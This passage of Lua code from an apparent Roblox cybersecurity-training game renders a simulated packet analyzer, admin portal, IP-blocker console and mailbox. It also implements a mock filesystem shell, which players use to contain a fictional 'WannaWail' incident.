summary = "The workstation can talk directly to player-data services across the exposed path.",
},
{
ip = host.ip,
protocol = "HTTP",
dns = "sync-edge.bloxcdn.net",
port = "80",
server = "VaultLeaf",
src = "192.168.43.20",
dst = "203.44.18.77",
tag = "Suspicious",
tone = "danger",
summary = "Unexpected cleartext callback leaves the protected zone during the capture window.",
},
{
ip = host.ip,
protocol = "DNS",
dns = "cdn.bloxplay.net",
port = "53",
server = "NameMesh",
src = "192.168.32.12",
dst = "192.168.32.10",
tag = "Normal",
tone = "normal",
summary = "Routine content delivery lookup from the workstation.",
},
}
elseif host.label == "PlayerData_Vault" then
rows = {
{
ip = host.ip,
protocol = "HTTPS",
dns = "playerdata.bloxplay.local",
port = "443",
server = "VaultLeaf",
src = "192.168.43.20",
dst = "192.168.43.2",
tag = "Internal",
tone = "normal",
summary = "Expected vault-to-gateway management traffic.",
},
{
ip = host.ip,
protocol = "HTTP",
dns = "sync-edge.bloxcdn.net",
port = "80",
server = "VaultLeaf",
src = "192.168.43.20",
dst = "203.44.18.77",
tag = "Suspicious",
tone = "danger",
summary = "External callback from the vault appears outside approved maintenance flow.",
},
{
ip = host.ip,
protocol = "HTTPS",
dns = "bloxplay.com/admin",
port = "443",
server = "CorePanel",
src = "192.168.43.2",
dst = "192.168.43.20",
tag = "Control",
tone = "warning",
summary = "Management traffic is transiting the same trust path as the incident activity.",
},
}
else
rows = {
{
ip = host.ip,
protocol = "DNS",
dns = "cdn.bloxplay.net",
port = "53",
server = "NameMesh",
src = host.ip,
dst = "192.168.32.10",
tag = "Normal",
tone = "normal",
summary = "Routine service discovery from the selected host.",
},
{
ip = host.ip,
protocol = "HTTPS",
dns = "bloxplay.com",
port = "443",
server = host.server,
src = host.ip,
dst = "192.168.32.10",
tag = "Observed",
tone = "warning",
summary = "General application traffic from the selected system.",
},
}
end
ActivePacketCapture.targetIP = host.ip
ActivePacketCapture.targetLabel = host.label
ActivePacketCapture.rows = rows
return true
end
local function renderAdminResults(query)
if not AdminResultsFrame then return end
query = tostring(query or ""):lower()
for _, child in ipairs(AdminResultsFrame:GetChildren()) do
if child:IsA("Frame") then
child:Destroy()
end
end
local layout = AdminResultsFrame:FindFirstChild("UIListLayout")
if not layout then
layout = mk("UIListLayout", {
Parent = AdminResultsFrame,
Name = "UIListLayout",
Padding = UDim.new(0, 6),
SortOrder = Enum.SortOrder.LayoutOrder,
})
end
local count = 0
for _, row in ipairs(FakeAdminRecords) do
local hay = (row.username .. " " .. row.role .. " " .. row.dept .. " " .. row.note):lower()
if query == "" or hay:find(query, 1, true) then
count = count + 1
local card = mk("Frame", {
Parent = AdminResultsFrame,
BackgroundColor3 = Color3.fromRGB(246, 248, 252),
BorderSizePixel = 0,
Size = UDim2.new(1, -10, 0, 92),
})
round(card, 8)
mk("TextLabel", {
Parent = card,
BackgroundTransparency = 1,
Text = "USER: " .. row.username,
Font = Enum.Font.GothamBold,
TextSize = 14,
TextColor3 = Color3.fromRGB(25, 30, 38),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 8),
Size = UDim2.new(1, -20, 0, 18),
})
mk("TextLabel", {
Parent = card,
BackgroundTransparency = 1,
Text = "ROLE: " .. row.role .. " DEPT: " .. row.dept,
Font = Enum.Font.Code,
TextSize = 13,
TextColor3 = Color3.fromRGB(45, 52, 64),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 30),
Size = UDim2.new(1, -20, 0, 16),
})
mk("TextLabel", {
Parent = card,
BackgroundTransparency = 1,
TextWrapped = true,
TextYAlignment = Enum.TextYAlignment.Top,
Text = "NOTE: " .. row.note,
Font = Enum.Font.Gotham,
TextSize = 13,
TextColor3 = Color3.fromRGB(65, 74, 88),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 50),
Size = UDim2.new(1, -20, 0, 34),
})
end
end
for _, row in ipairs(FakePlayerRows) do
local hay = ("player " .. row.username .. " " .. row.display .. " " .. row.region .. " " .. row.plan .. " " .. row.status):lower()
if query ~= "" and hay:find(query, 1, true) then
count = count + 1
local card = mk("Frame", {
Parent = AdminResultsFrame,
BackgroundColor3 = Color3.fromRGB(240, 247, 255),
BorderSizePixel = 0,
Size = UDim2.new(1, -10, 0, 92),
})
round(card, 8)
mk("TextLabel", {
Parent = card,
BackgroundTransparency = 1,
Text = "PLAYER: " .. row.username .. " (" .. row.display .. ")",
Font = Enum.Font.GothamBold,
TextSize = 14,
TextColor3 = Color3.fromRGB(25, 30, 38),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 8),
Size = UDim2.new(1, -20, 0, 18),
})
mk("TextLabel", {
Parent = card,
BackgroundTransparency = 1,
Text = "REGION: " .. row.region .. " PLAN: " .. row.plan,
Font = Enum.Font.Code,
TextSize = 13,
TextColor3 = Color3.fromRGB(45, 52, 64),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 30),
Size = UDim2.new(1, -20, 0, 16),
})
mk("TextLabel", {
Parent = card,
BackgroundTransparency = 1,
Text = "STATUS: " .. row.status,
Font = Enum.Font.Gotham,
TextSize = 13,
TextColor3 = Color3.fromRGB(65, 74, 88),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 52),
Size = UDim2.new(1, -20, 0, 20),
})
end
end
if count == 0 then
local empty = mk("Frame", {
Parent = AdminResultsFrame,
BackgroundColor3 = Color3.fromRGB(246, 248, 252),
BorderSizePixel = 0,
Size = UDim2.new(1, -10, 0, 48),
})
round(empty, 8)
mk("TextLabel", {
Parent = empty,
BackgroundTransparency = 1,
Text = "No database results found (sim).",
Font = Enum.Font.Gotham,
TextSize = 14,
TextColor3 = Color3.fromRGB(65, 74, 88),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 12),
Size = UDim2.new(1, -20, 0, 20),
})
end
task.defer(function()
AdminResultsFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
end)
end
local function showTextPage(text, status)
hideAllBrowserPages()
if PageLabel then
PageLabel.Visible = true
PageLabel.Text = text or ""
end
setBrowserStatus(status or "Static page loaded (sim)")
end
local function showAdminLoginPage(url)
hideAllBrowserPages()
if AdminLoginPage then
AdminLoginPage.Visible = true
end
if AdminLoginStatus then
AdminLoginStatus.Text = "Administrator credentials required."
end
setBrowserStatus(("Loaded %s (credentials required)"):format(url))
end
local function renderAdminLogs()
if not AdminDashboardPage then return end
local logsFrame = AdminDashboardPage:FindFirstChild("AdminLogsFrame")
if not logsFrame or not logsFrame:IsA("ScrollingFrame") then return end
for _, child in ipairs(logsFrame:GetChildren()) do
if child:IsA("Frame") then
child:Destroy()
end
end
local layout = logsFrame:FindFirstChild("UIListLayout")
if not layout then
layout = mk("UIListLayout", {
Parent = logsFrame,
Name = "UIListLayout",
Padding = UDim.new(0, 6),
SortOrder = Enum.SortOrder.LayoutOrder,
})
end
local logs = {}
for _, entry in ipairs(AdminLogFeed.base) do
logs[#logs + 1] = entry
end
for _, entry in ipairs(getWannaWailIncidentLogs()) do
logs[#logs + 1] = entry
end
for _, entry in ipairs(logs) do
local chipColor = Color3.fromRGB(78, 125, 255)
local cardColor = Color3.fromRGB(243, 247, 255)
if entry.severity == "MEDIUM" then
chipColor = Color3.fromRGB(208, 143, 38)
cardColor = Color3.fromRGB(255, 249, 235)
elseif entry.severity == "HIGH" then
chipColor = Color3.fromRGB(212, 92, 49)
cardColor = Color3.fromRGB(255, 243, 239)
elseif entry.severity == "CRITICAL" then
chipColor = Color3.fromRGB(184, 43, 43)
cardColor = Color3.fromRGB(255, 236, 236)
end
local card = mk("Frame", {
Parent = logsFrame,
BackgroundColor3 = cardColor,
BorderSizePixel = 0,
Size = UDim2.new(1, -10, 0, 88),
})
round(card, 8)
local chip = mk("TextLabel", {
Parent = card,
BackgroundColor3 = chipColor,
BorderSizePixel = 0,
Text = tostring(entry.severity),
Font = Enum.Font.GothamBold,
TextSize = 11,
TextColor3 = Color3.new(1, 1, 1),
Position = UDim2.new(0, 10, 0, 10),
Size = UDim2.new(0, 76, 0, 20),
})
round(chip, 6)
mk("TextLabel", {
Parent = card,
BackgroundTransparency = 1,
Text = tostring(entry.stamp),
Font = Enum.Font.Code,
TextSize = 12,
TextColor3 = Color3.fromRGB(70, 78, 92),
TextXAlignment = Enum.TextXAlignment.Right,
Position = UDim2.new(1, -88, 0, 12),
Size = UDim2.new(0, 78, 0, 18),
})
mk("TextLabel", {
Parent = card,
BackgroundTransparency = 1,
Text = tostring(entry.title),
Font = Enum.Font.GothamBold,
TextSize = 14,
TextColor3 = Color3.fromRGB(25, 30, 38),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 36),
Size = UDim2.new(1, -20, 0, 18),
})
mk("TextLabel", {
Parent = card,
BackgroundTransparency = 1,
TextWrapped = true,
TextYAlignment = Enum.TextYAlignment.Top,
Text = tostring(entry.detail),
Font = Enum.Font.Gotham,
TextSize = 13,
TextColor3 = Color3.fromRGB(70, 78, 92),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 56),
Size = UDim2.new(1, -20, 0, 24),
})
end
task.defer(function()
logsFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
end)
end
local function renderIPBlockerHistory()
local ipBlockerPage = BrowserContent and BrowserContent:FindFirstChild("IPBlockerPage")
local historyFrame = ipBlockerPage and ipBlockerPage:FindFirstChild("IPBlockerHistoryFrame")
if not historyFrame or not historyFrame:IsA("ScrollingFrame") then return end
for _, child in ipairs(historyFrame:GetChildren()) do
if child:IsA("Frame") then
child:Destroy()
end
end
local layout = historyFrame:FindFirstChild("UIListLayout")
if not layout then
layout = mk("UIListLayout", {
Parent = historyFrame,
Name = "UIListLayout",
Padding = UDim.new(0, 6),
SortOrder = Enum.SortOrder.LayoutOrder,
})
end
local blockedIPs = browserState.blockedIPs or {}
if #blockedIPs == 0 then
local empty = mk("Frame", {
Parent = historyFrame,
BackgroundColor3 = Color3.fromRGB(240, 243, 249),
BorderSizePixel = 0,
Size = UDim2.new(1, -10, 0, 48),
})
round(empty, 8)
mk("TextLabel", {
Parent = empty,
BackgroundTransparency = 1,
Text = "No blocked sources recorded yet.",
Font = Enum.Font.Gotham,
TextSize = 13,
TextColor3 = Color3.fromRGB(70, 78, 92),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 14),
Size = UDim2.new(1, -20, 0, 18),
})
else
for _, ip in ipairs(blockedIPs) do
local row = mk("Frame", {
Parent = historyFrame,
BackgroundColor3 = Color3.fromRGB(236, 245, 238),
BorderSizePixel = 0,
Size = UDim2.new(1, -10, 0, 54),
})
round(row, 8)
mk("TextLabel", {
Parent = row,
BackgroundTransparency = 1,
Text = ip,
Font = Enum.Font.Code,
TextSize = 13,
TextColor3 = Color3.fromRGB(22, 86, 46),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 10),
Size = UDim2.new(1, -20, 0, 16),
})
mk("TextLabel", {
Parent = row,
BackgroundTransparency = 1,
Text = "Browser response rule active",
Font = Enum.Font.Gotham,
TextSize = 12,
TextColor3 = Color3.fromRGB(49, 101, 68),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 28),
Size = UDim2.new(1, -20, 0, 14),
})
end
end
task.defer(function()
historyFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
end)
end
local function showAdminDashboard(url)
hideAllBrowserPages()
if AdminDashboardPage then
AdminDashboardPage.Visible = true
end
local databaseTabBtn = AdminDashboardPage and AdminDashboardPage:FindFirstChild("AdminDatabaseTabBtn")
local logsTabBtn = AdminDashboardPage and AdminDashboardPage:FindFirstChild("AdminLogsTabBtn")
local logsFrame = AdminDashboardPage and AdminDashboardPage:FindFirstChild("AdminLogsFrame")
local showLogs = browserState.adminTab == "logs"
if AdminSearchBox then
AdminSearchBox.Visible = not showLogs
end
if AdminResultsFrame then
AdminResultsFrame.Visible = not showLogs
end
if logsFrame then
logsFrame.Visible = showLogs
end
if databaseTabBtn and databaseTabBtn:IsA("TextButton") then
databaseTabBtn.BackgroundColor3 = showLogs and Color3.fromRGB(100, 110, 132) or Color3.fromRGB(76, 123, 255)
end
if logsTabBtn and logsTabBtn:IsA("TextButton") then
logsTabBtn.BackgroundColor3 = showLogs and Color3.fromRGB(76, 123, 255) or Color3.fromRGB(100, 110, 132)
end
if showLogs then
renderAdminLogs()
setBrowserStatus(("Authenticated to %s - security logs live"):format(url))
else
renderAdminResults(AdminSearchBox and AdminSearchBox.Text or "")
setBrowserStatus(("Authenticated to %s (database view)"):format(url))
end
end
local function showIPBlockerPage(url)
hideAllBrowserPages()
local ipBlockerPage = BrowserContent and BrowserContent:FindFirstChild("IPBlockerPage")
if ipBlockerPage then
ipBlockerPage.Visible = true
end
local inputBox = ipBlockerPage and ipBlockerPage:FindFirstChild("IPBlockerInputBox")
if inputBox and inputBox:IsA("TextBox") then
inputBox.Text = ""
end
local statusLabel = ipBlockerPage and ipBlockerPage:FindFirstChild("IPBlockerStatus")
if statusLabel and statusLabel:IsA("TextLabel") then
statusLabel.Text = "Enter a hostile source from the investigation feed."
end
renderIPBlockerHistory()
setBrowserStatus(("Loaded %s response console (sim)"):format(url))
end
local function showMailPage(url)
hideAllBrowserPages()
local mailPage = BrowserContent and BrowserContent:FindFirstChild("MailPage")
if mailPage then
mailPage.Visible = true
end
if (browserState.selectedMailId == nil or browserState.selectedMailId == "") and type(CHAPTER3_MAILBOX[1]) == "table" then
browserState.selectedMailId = tostring(CHAPTER3_MAILBOX[1].id or "")
end
if browserState._renderMailPage then
browserState._renderMailPage()
end
setBrowserStatus(("Loaded %s staff inbox (sim)"):format(url))
end

local function packetMatchesFilter(pkt, dnsFilter)
dnsFilter = tostring(dnsFilter or ""):lower()
if dnsFilter == "" then
return true
end
local blob = (pkt.dns .. " " .. pkt.server .. " " .. pkt.protocol .. " " .. pkt.src .. " " .. pkt.dst):lower()
return blob:find(dnsFilter, 1, true) ~= nil
end
local function populatePacketRows()
if not PacketListFrame then return end
for _, child in ipairs(PacketListFrame:GetChildren()) do
if child:IsA("Frame") then
child:Destroy()
end
end
local layout = PacketListFrame:FindFirstChild("UIListLayout")
if not layout then
layout = mk("UIListLayout", {
Parent = PacketListFrame,
Name = "UIListLayout",
Padding = UDim.new(0, 6),
SortOrder = Enum.SortOrder.LayoutOrder,
})
end
local ipFilter = PacketIPBox and PacketIPBox.Text or ""
local dnsFilter = PacketDNSBox and PacketDNSBox.Text or ""
local host = getHostByIP(ipFilter)
local rows = {}
if host then
if ActivePacketCapture.targetIP ~= host.ip then
startPacketCaptureForIP(host.ip)
end
for _, row in ipairs(ActivePacketCapture.rows) do
if packetMatchesFilter(row, dnsFilter) then
table.insert(rows, row)
end
end
end
if not host then
local row = mk("Frame", {
Parent = PacketListFrame,
BackgroundColor3 = Color3.fromRGB(244, 247, 252),
BorderSizePixel = 0,
Size = UDim2.new(1, -10, 0, 54),
})
round(row, 8)
mk("TextLabel", {
Parent = row,
BackgroundTransparency = 1,
Text = "Enter a valid target IP to begin capture (sim).",
Font = Enum.Font.Gotham,
TextSize = 14,
TextColor3 = Color3.fromRGB(55, 66, 82),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 16),
Size = UDim2.new(1, -20, 0, 20),
})
elseif #rows == 0 then
local row = mk("Frame", {
Parent = PacketListFrame,
BackgroundColor3 = Color3.fromRGB(244, 247, 252),
BorderSizePixel = 0,
Size = UDim2.new(1, -10, 0, 54),
})
round(row, 8)
mk("TextLabel", {
Parent = row,
BackgroundTransparency = 1,
Text = "No packets match the current DNS filter (sim).",
Font = Enum.Font.Gotham,
TextSize = 14,
TextColor3 = Color3.fromRGB(55, 66, 82),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 10, 0, 16),
Size = UDim2.new(1, -20, 0, 20),
})
end
for _, pkt in ipairs(rows) do
local rowColor = Color3.fromRGB(241, 246, 252)
local accentColor = Color3.fromRGB(76, 123, 255)
local chipText = Color3.new(1, 1, 1)
if pkt.tone == "warning" then
rowColor = Color3.fromRGB(255, 248, 234)
accentColor = Color3.fromRGB(210, 143, 38)
elseif pkt.tone == "danger" then
rowColor = Color3.fromRGB(255, 238, 238)
accentColor = Color3.fromRGB(186, 61, 61)
end
local row = mk("Frame", {
Parent = PacketListFrame,
BackgroundColor3 = rowColor,
BorderSizePixel = 0,
Size = UDim2.new(1, -10, 0, 114),
})
round(row, 8)
mk("Frame", {
Parent = row,
BackgroundColor3 = accentColor,
BorderSizePixel = 0,
Position = UDim2.new(0, 0, 0, 0),
Size = UDim2.new(0, 6, 1, 0),
})
mk("TextLabel", {
Parent = row,
BackgroundTransparency = 1,
Text = pkt.protocol .. "  " .. pkt.src .. "  ->  " .. pkt.dst,
Font = Enum.Font.GothamBold,
TextSize = 13,
TextColor3 = Color3.fromRGB(20, 20, 28),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 14, 0, 8),
Size = UDim2.new(1, -124, 0, 18),
})
local chip = mk("TextLabel", {
Parent = row,
BackgroundColor3 = accentColor,
BorderSizePixel = 0,
Text = pkt.tag,
Font = Enum.Font.GothamBold,
TextSize = 11,
TextColor3 = chipText,
Position = UDim2.new(1, -100, 0, 8),
Size = UDim2.new(0, 88, 0, 20),
})
round(chip, 6)
mk("TextLabel", {
Parent = row,
BackgroundTransparency = 1,
Text = "DNS: " .. pkt.dns .. "    PORT: " .. pkt.port .. "    SERVER: " .. pkt.server,
Font = Enum.Font.Code,
TextSize = 12,
TextColor3 = Color3.fromRGB(35, 45, 60),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 14, 0, 32),
Size = UDim2.new(1, -28, 0, 16),
})
mk("TextLabel", {
Parent = row,
BackgroundTransparency = 1,
TextWrapped = true,
TextYAlignment = Enum.TextYAlignment.Top,
Text = pkt.summary,
Font = Enum.Font.Gotham,
TextSize = 13,
TextColor3 = Color3.fromRGB(58, 67, 80),
TextXAlignment = Enum.TextXAlignment.Left,
Position = UDim2.new(0, 14, 0, 56),
Size = UDim2.new(1, -28, 0, 42),
})
end
task.defer(function()
PacketListFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
end)
end
local function showPacketPage(url)
hideAllBrowserPages()
if PacketPage then
PacketPage.Visible = true
end
populatePacketRows()
setBrowserStatus(("Loaded %s packet analyzer (sim)"):format(url))
end
local function navigateTo(url)
local uNorm = normalizeUrl(url)
browserState.currentUrl = uNorm
if UrlBox then
UrlBox.Text = uNorm == "about:blank" and "" or uNorm
end
if uNorm == "about:blank" then
showTextPage("", "")
return
end
if uNorm == "bloxplay.com/admin" or uNorm == "www.bloxplay.com/admin" then
local result = submitScenarioAction and submitScenarioAction("browser_visit bloxplay.com/admin", { "ch2_admin_portal" })
if browserState.adminLoggedIn then
showAdminDashboard(uNorm)
else
showAdminLoginPage(uNorm)
end
if result and result.success then
setBrowserStatus("Admin portal reached. Mission step complete.")
end
return
end
if uNorm == "mail.bloxplay.com" or uNorm == "www.mail.bloxplay.com" then
local result = submitScenarioAction and submitScenarioAction("browser_visit mail.bloxplay.com", { "ch3_mail_site" })
showMailPage(uNorm)
queueAutoSave(false)
if result and result.success then
setBrowserStatus("BloxMail opened. Mission step complete.")
end
return
end
if uNorm == "rbxpacketnet.com" or uNorm == "www.rbxpacketnet.com" then
local result = submitScenarioAction and submitScenarioAction("browser_visit rbxpacketnet.com", { "ch1_packetnet" })
showPacketPage(uNorm)
queueAutoSave(false)
if result and result.success then
setBrowserStatus("RBXPacketNet opened. Mission step complete.")
end
return
end
if uNorm == "rbxipblocker.com" or uNorm == "www.rbxipblocker.com" then
local result = submitScenarioAction and submitScenarioAction("browser_visit rbxipblocker.com", { "ch4_visit_blocker" })
showIPBlockerPage(uNorm)
queueAutoSave(false)
if result and result.success then
setBrowserStatus("RBXIPBlocker opened. Mission step complete.")
end
return
end
showTextPage(PAGES[uNorm] or ('No renderer for "%s" (sim).'):format(url), "Page loaded (sim)")
queueAutoSave(false)
end
captureProgressState = function()
local openFiles = {}
for pathName, isOpen in pairs(OpenFiles) do
if isOpen then
openFiles[#openFiles + 1] = tostring(pathName)
end
end
table.sort(openFiles)
local sniffCache = nil
if type(terminalState.sniffCache) == "table" then
sniffCache = {
host = terminalState.sniffCache.host,
ip = terminalState.sniffCache.ip,
server = terminalState.sniffCache.server,
attackerIP = terminalState.sniffCache.attackerIP,
}
end
local blockedIPs = {}
for _, ip in ipairs(browserState.blockedIPs or {}) do
blockedIPs[#blockedIPs + 1] = tostring(ip)
end
table.sort(blockedIPs)
return {
browserState = {
adminLoggedIn = browserState.adminLoggedIn == true,
currentUrl = tostring(browserState.currentUrl or "about:blank"),
stickyNoteInspected = browserState.stickyNoteInspected == true,
adminTab = browserState.adminTab == "logs" and "logs" or "database",
blockedIPs = blockedIPs,
selectedMailId = tostring(browserState.selectedMailId or ""),
},
terminalState = {
currentHost = tostring(terminalState.currentHost or "local"),
currentDir = tostring(terminalState.currentDir or "/"),
connectedHost = terminalState.connectedHost,
sshSession = terminalState.sshSession == true,
scanCache = terminalState.scanCache,
sniffCache = sniffCache,
lastAttackerIP = tostring(terminalState.lastAttackerIP or "203.44.18.77"),
},
packetCapture = {
targetIP = tostring(ActivePacketCapture.targetIP or ""),
targetLabel = tostring(ActivePacketCapture.targetLabel or ""),
},
openFiles = openFiles,
}
end
applyProgressState = function(state)
if type(state) ~= "table" then
return false
end
local browser = type(state.browserState) == "table" and state.browserState or {}
local terminal = type(state.terminalState) == "table" and state.terminalState or {}
local packetCapture = type(state.packetCapture) == "table" and state.packetCapture or {}
local sniffCache = nil
if type(terminal.sniffCache) == "table" then
sniffCache = {
host = terminal.sniffCache.host,
ip = terminal.sniffCache.ip,
server = terminal.sniffCache.server,
attackerIP = terminal.sniffCache.attackerIP,
}
end
local blockedIPs = {}
if type(browser.blockedIPs) == "table" then
for _, ip in ipairs(browser.blockedIPs) do
if type(ip) == "string" and ip ~= "" then
blockedIPs[#blockedIPs + 1] = ip
end
end
end
browserState = {
adminLoggedIn = browser.adminLoggedIn == true,
currentUrl = type(browser.currentUrl) == "string" and browser.currentUrl or "about:blank",
stickyNoteInspected = browser.stickyNoteInspected == true,
adminTab = browser.adminTab == "logs" and "logs" or "database",
blockedIPs = blockedIPs,
selectedMailId = type(browser.selectedMailId) == "string" and browser.selectedMailId or (type(CHAPTER3_MAILBOX[1]) == "table" and tostring(CHAPTER3_MAILBOX[1].id or "") or ""),
logStreamStartedAt = 0,
logsLastRender = 0,
}
terminalState = {
currentHost = type(terminal.currentHost) == "string" and terminal.currentHost or "local",
currentDir = type(terminal.currentDir) == "string" and terminal.currentDir or "/",
connectedHost = type(terminal.connectedHost) == "string" and terminal.connectedHost or nil,
sshSession = terminal.sshSession == true,
scanCache = type(terminal.scanCache) == "string" and terminal.scanCache or nil,
sniffCache = sniffCache,
lastAttackerIP = type(terminal.lastAttackerIP) == "string" and terminal.lastAttackerIP or "203.44.18.77",
}
ActivePacketCapture = {
targetIP = type(packetCapture.targetIP) == "string" and packetCapture.targetIP or "",
targetLabel = type(packetCapture.targetLabel) == "string" and packetCapture.targetLabel or "",
rows = {},
}
if ActivePacketCapture.targetIP ~= "" then
startPacketCaptureForIP(ActivePacketCapture.targetIP)
end
OpenFiles = {}
if type(state.openFiles) == "table" then
for _, pathName in ipairs(state.openFiles) do
if type(pathName) == "string" and pathName ~= "" then
OpenFiles[pathName] = true
end
end
end
if UrlBox then
UrlBox.Text = browserState.currentUrl == "about:blank" and "" or browserState.currentUrl
end
if PacketIPBox then
PacketIPBox.Text = ActivePacketCapture.targetIP
end
if PacketDNSBox then
PacketDNSBox.Text = ""
end
if PacketPage and PacketPage.Visible then
populatePacketRows()
end
if BrowserFrame and BrowserFrame.Visible then
navigateTo(browserState.currentUrl)
end
Player:SetAttribute("Obj_Admin", browserState.adminLoggedIn)
return true
end
applyPendingRestoreState = function()
local raw = Player:GetAttribute(RESTORE_STATE_ATTRIBUTE)
if type(raw) ~= "string" or raw == "" then
return false
end
Player:SetAttribute(RESTORE_STATE_ATTRIBUTE, nil)
local ok, state = pcall(function()
return Http:JSONDecode(raw)
end)
if not ok or type(state) ~= "table" then
return false
end
return applyProgressState(state)
end
do
local simOps = browserState._simOps or {}
browserState._simOps = simOps

local function getHostKey()
if terminalState.currentHost == "PlayerData_Vault" then
return "playerdata_vault"
end
return terminalState.currentHost == "local" and "localhost" or "localhost"
end
local function getFS()
local host = getHostKey()
return SimFSByHost[host] or SimFSByHost.localhost
end
local function getContents()
    local host = getHostKey()
    return SimFileContentsByHost[host] or SimFileContentsByHost.localhost
end
local function getMetadata()
    local host = getHostKey()
    return SimMetadataByHost[host] or SimMetadataByHost.localhost
end
local function getProcesses()
    local host = getHostKey()
    return SimProcessesByHost[host] or SimProcessesByHost.localhost
end
local function refreshWannaWailContainmentState()
local sourceBlocked = Player:GetAttribute(WANNAWAIL_ATTR_SOURCE_BLOCKED) == true
local firewallBlocked = Player:GetAttribute(WANNAWAIL_ATTR_FIREWALL_BLOCKED) == true
local processKilled = Player:GetAttribute(WANNAWAIL_ATTR_PROCESS_KILLED) == true
local loaderRemoved = Player:GetAttribute(WANNAWAIL_ATTR_LOADER_REMOVED) == true
Player:SetAttribute(WANNAWAIL_ATTR_CONTAINED, sourceBlocked and firewallBlocked and processKilled and loaderRemoved)
end
local function markWannaWailFlag(attributeName, value)
Player:SetAttribute(attributeName, value == true)
refreshWannaWailContainmentState()
end
local function splitPath(path)
    local parts = {}
    for part in tostring(path or ""):gmatch("[^/]+") do
        parts[#parts + 1] = part
    end
    return parts
end
local function pathJoin(base, name)
    if base == "/" then
        return "/" .. tostring(name or "")
    end
    return tostring(base or "/") .. "/" .. tostring(name or "")
end
local function pathParent(path)
    local resolved = tostring(path or "/")
    if resolved == "/" then
        return nil
    end
    local parts = splitPath(resolved)
    table.remove(parts)
    if #parts == 0 then
        return "/"
    end
    return "/" .. table.concat(parts, "/")
end
local function normalizePath(path)
    local raw = tostring(path or ""):gsub("^%s+", ""):gsub("%s+$", "")
    if raw == "" then
        return terminalState.currentDir
    end
    local parts = {}
    if raw:sub(1, 1) ~= "/" then
        for _, part in ipairs(splitPath(terminalState.currentDir)) do
            parts[#parts + 1] = part
        end
    end
    for _, part in ipairs(splitPath(raw)) do
        if part == "." or part == "" then
        elseif part == ".." then
            if #parts > 0 then
                table.remove(parts)
            end
        else
            parts[#parts + 1] = part
        end
    end
    if #parts == 0 then
        return "/"
    end
    return "/" .. table.concat(parts, "/")
end
local function pathLeaf(path)
    local resolved = normalizePath(path)
    if resolved == "/" then
        return "/"
    end
    local parts = splitPath(resolved)
    return parts[#parts] or resolved
end
local function isDirectoryPath(path)
    return getFS()[normalizePath(path)] ~= nil
end
local function isFilePath(path)
    return getContents()[normalizePath(path)] ~= nil
end
local function getEntryMetadata(path)
    return getMetadata()[normalizePath(path)]
end
local function getEntrySize(path)
    local resolved = normalizePath(path)
    if isDirectoryPath(resolved) then
        local entries = getFS()[resolved] or {}
        return ("%d item(s)"):format(#entries)
    end
    local content = getContents()[resolved]
    if content == nil then
        return "unknown"
    end
    return ("%d B"):format(#tostring(content))
end
local function formatListingLine(path)
    local resolved = normalizePath(path)
    local meta = getEntryMetadata(resolved)
    local name = pathLeaf(resolved)
    if meta and meta.type == "directory" and name ~= "/" then
        name = name .. "/"
    end
    if not meta then
        return " " .. name
    end
    return ("%s %-14s %-10s %-10s %s"):format(
        meta.permissions or "----------",
        meta.owner or "unknown",
        meta.group or "unknown",
        getEntrySize(resolved),
        name
    )
end
local function listPath(path)
    local target = ""
    local longFormat = false
    for token in tostring(path or ""):gmatch("%S+") do
        if token == "-l" or token == "--long" then
            longFormat = true
        else
            target = token
        end
    end
    local p = normalizePath(target)
    local fs = getFS()
    if isFilePath(p) then
        addLine(formatListingLine(p))
        return
    end
    local list = fs[p]
    if not list then
        addLine(("ls: cannot access '%s': No such file or directory (sim)"):format(p))
        return
    end
    addLine(("Listing %s on %s (sim)"):format(p, terminalState.currentHost))
    for _, name in ipairs(list) do
        local childPath = pathJoin(p, name)
        if longFormat then
            addLine(formatListingLine(childPath))
        else
            local meta = getEntryMetadata(childPath)
            local suffix = meta and meta.type == "directory" and "/" or ""
            addLine(" " .. name .. suffix)
        end
    end
end
local function catFile(path)
    local resolved = normalizePath(path)
    local name = pathLeaf(resolved)
    local contents = getContents()
    local content = contents[resolved]
    if not content then
        if isDirectoryPath(resolved) then
            addLine(("cat: %s: Is a directory (sim)"):format(resolved))
        else
            addLine(("cat: %s: No such file (sim)"):format(tostring(path)))
        end
        return
    end
    addLine(("--- %s ---"):format(name))
    for line in tostring(content):gmatch("[^\n]+") do
        addLine(line)
    end
end
local function openFile(path)
    local resolved = normalizePath(path)
    local name = pathLeaf(resolved)
    local contents = getContents()
    if not contents[resolved] then
        addLine(("openfile: %s not found (sim)"):format(tostring(path)))
        return
    end
    OpenFiles[resolved] = true
    addLine(("Opened %s (sim)"):format(name))
end
local function closeFile(path)
    local resolved = normalizePath(path)
    local name = pathLeaf(resolved)
    if OpenFiles[resolved] then
        OpenFiles[resolved] = nil
        addLine(("Closed %s (sim)"):format(name))
    else
        addLine(("closefile: %s is not open (sim)"):format(name))
    end
end
local function removeFile(path)
    local resolved = normalizePath(path)
    local name = pathLeaf(resolved)
    local contents = getContents()
    local fs = getFS()
    local metadata = getMetadata()
